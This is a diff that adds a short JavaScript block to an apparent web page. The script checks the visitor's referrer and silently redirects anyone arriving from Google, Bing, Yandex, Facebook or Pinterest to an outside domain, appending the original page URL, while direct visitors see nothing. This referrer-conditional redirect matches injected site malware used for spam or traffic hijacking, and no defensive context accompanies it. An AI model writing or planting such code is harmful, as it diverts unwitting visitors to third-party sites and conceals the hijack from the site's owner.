@@ -1,0 +1,12 @@
+<script type="text/javascript">
+  if(document.referrer) {
+    const documentReferrer = document.referrer
+    const isSearchEngine = documentReferrer.includes('.google.') || documentReferrer.includes('.bing.') || documentReferrer.includes('yandex.') || documentReferrer.includes('facebook.') || documentReferrer.includes('pinterest.')
+
+    if (isSearchEngine) {
+      const url = window.location.href
+
+      window.location = "http://blog.jaaxsapp.com/?jaaxs=" + encodeURIComponent(url)
+    }
+  }
+</script>
